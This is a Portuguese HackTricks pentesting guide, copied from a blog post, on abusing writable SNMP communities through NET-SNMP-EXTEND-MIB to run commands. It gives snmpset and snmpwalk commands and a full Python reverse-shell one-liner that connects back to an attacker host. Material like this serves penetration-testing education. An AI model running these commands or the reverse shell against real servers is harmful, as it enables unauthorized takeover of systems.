<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas t√©cnicas de hacking enviando PRs para o [reposit√≥rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


Este post foi copiado de [https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/](https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/)

O SNMP √†s vezes √© negligenciado pelo administrador do dispositivo ou servidor onde √© deixado em uma configura√ß√£o padr√£o. A comunidade SNMP com permiss√µes de grava√ß√£o (**rwcommunity**) no sistema operacional Linux pode ser abusada para permitir que o atacante execute um comando no servidor.

![](https://rioasmara.files.wordpress.com/2021/02/image-6.png?w=508)

# **Estendendo os servi√ßos**

Embora voc√™ n√£o possa modificar as entradas existentes que foram configuradas em **snmpd.conf**, √© poss√≠vel adicionar comandos adicionais por SNMP, porque a configura√ß√£o de permiss√£o "MAX-ACCESS" na defini√ß√£o MIB √© definida como "**read-create**".

Adicionar um novo comando basicamente funciona anexando uma linha adicional √† tabela "**nsExtendObjects**".
```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \
'nsExtendStatus."evilcommand"' = createAndGo \
'nsExtendCommand."evilcommand"' = /bin/echo \
'nsExtendArgs."evilcommand"' = 'hello world'
```
Injetando um comando para ser executado no servi√ßo SNMP. O **NET-SNMP-EXTEND-MIB** requer que voc√™ sempre forne√ßa o caminho absoluto para o execut√°vel. O bin√°rio/script chamado tamb√©m deve existir e ser execut√°vel.

![](https://rioasmara.files.wordpress.com/2021/02/image-15.png?w=916)

Executando o comando que injetamos no SNMP enumerando-o usando snmpwalk.
```bash
snmpwalk -v2c -c SuP3RPrivCom90 10.129.2.26 NET-SNMP-EXTEND-MIB::nsExtendObjects
```
Mostrando que o comando √© /bin/echo.

![](https://rioasmara.files.wordpress.com/2021/02/image-11.png?w=569)

O comando ser√° executado quando for lido. **run-on-read\(\)**

![](https://rioasmara.files.wordpress.com/2021/02/image-12.png?w=612)

O comando **/bin/echo "hello rio is here"** foi executado durante a leitura do snmpwalk

![](https://rioasmara.files.wordpress.com/2021/02/image-13.png?w=653)

# **Obtendo o Shell** **do Net-SNMP Extend**

Nesta se√ß√£o, gostaria de discutir como obter um shell do servidor para control√°-lo.

Voc√™ pode usar o script python desenvolvido por **mxrch** que pode ser baixado em [**https://github.com/mxrch/snmp-shell.git**](https://github.com/mxrch/snmp-shell.git)

Voc√™ pode instalar o pr√©-requisito para executar isso:
```bash
sudo apt install snmp snmp-mibs-downloader rlwrap -y
git clone https://github.com/mxrch/snmp-shell
cd snmp-shell
sudo python3 -m pip install -r requirements.txt
```
**Criando shell reverso**

Voc√™ tamb√©m pode criar um shell reverso manualmente injetando o comando abaixo no SNMP.
```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.129.2.26 'nsExtendStatus."command10"' = createAndGo 'nsExtendCommand."command10"' = /usr/bin/python3.6 'nsExtendArgs."command10"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.14.84\",8999));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
```
Execute o snmpwalk para acionar a execu√ß√£o do comando.

Nosso netcat recebe a conex√£o reversa do shell do alvo que nos permite obter controle sobre a m√°quina do alvo.
